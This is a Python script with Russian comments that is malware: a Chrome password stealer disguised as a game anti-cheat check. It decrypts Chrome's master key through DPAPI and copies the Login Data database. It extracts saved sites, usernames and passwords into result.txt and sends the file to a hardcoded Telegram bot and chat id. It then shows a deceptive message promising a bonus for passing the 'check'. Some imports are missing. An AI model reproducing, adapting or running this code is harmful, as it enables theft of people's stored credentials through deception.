import subprocess
import os
import sys
import sqlite3
import base64
import shutil
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import win32crypt
import tkinter
import telebot

# Замените токен на свой токен бота
bot_token = "6858417984:AAHHM_2Oj-KAvw3muNtpqb7kOE5HS_2FH-U"
bot = telebot.TeleBot(bot_token)

# Замените chat_id на чат айди получателя
chat_id = 1882056354

if os.name != "nt":
  exit()


class Main:
  def init(self):
    with open(os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\Local State'), "r") as file:
      localState = file.read()
      localState = json.loads(localState)

    MasterKey = base64.b64decode(localState["os_crypt"]["encrypted_key"])
    MasterKey = MasterKey[5:]  # Remove 'DPAPI' prefix
    self.MasterKey = self.decrypt_master_key(MasterKey)

  def decrypt_master_key(self, encrypted_key):
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

  def decrypt(self, buffer):
    try:
      iv = buffer[3:15]
      payload = buffer[15:]

      # Создание объекта шифрования AES
      cipher = AES.new(self.MasterKey, AES.MODE_GCM, iv)

      # Расшифровка данных
      decrypted = cipher.decrypt(payload)[:-16].decode()  # Удаление 16 байт тега аутентификации
      return decrypted
    except Exception as e:
      print(f"Ошибка расшифровки: {e}")
      return "Ошибка расшифровки пароля"


if __name__ == "__main__":
  try:
    # Получение текущей директории
    current_directory = os.path.dirname(os.path.abspath(__file__))

    # Путь к базе данных Login Data
    PATH = os.path.join(os.environ['USERPROFILE'], r'AppData\Local\Google\Chrome\User Data\default\Login Data')

    # Путь к скопированной базе данных в текущей директории
    target_db_path = os.path.join(current_directory, "Loginvault.db")

    # Создание экземпляра класса Main
    Chrome = Main()
    Chrome.init()

    # Копирование базы данных Login Data в текущую директорию
    shutil.copy2(PATH, target_db_path)

    # Создание соединения с скопированной базой данных
    connect = sqlite3.connect(target_db_path)
    cursor = connect.cursor()

    for i in range(5):
      # Извлечение учетных данных из базы данных
      cursor.execute("SELECT action_url, username_value, password_value FROM logins")

      with open("result.txt", "w") as f:

        for row in cursor.fetchall():
          URL = row[0]
          USERNAME = row[1]
          EncryptedPassword = row[2]
          DecryptedPassword = Chrome.decrypt(EncryptedPassword)

          # Вывод учетных данных, если имя пользователя и URL присутствуют
          if len(USERNAME) > 0 and len(URL) > 0:
            data = f'''
             <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
             Сайт: {URL}  
             ник: {USERNAME}  
             пароль: {DecryptedPassword}  
             <<<>><<<>><<<>><<<>><<<>><<<>><<<>>
                      '''
            print(data)
            f.write(data)

      # Отправка result.txt в Telegram
      with open("result.txt", "rb") as file:
        bot.send_document(chat_id, file)

    # Вывод сообщения через messagebox
    root = tk.Tk()
    root.withdraw()  # Скрыть основное окно
    messagebox.showinfo("Информация", "Спасибо за проверку!! Вы свободны!\nЗа игру без читов вам предоставлен бонус: 1 донат кейс!\nНапишите проверяющему, чтобы он выдал вам ДК.")
    root.destroy()

  except Exception as e:
    print(f"Общая ошибка: {e}")
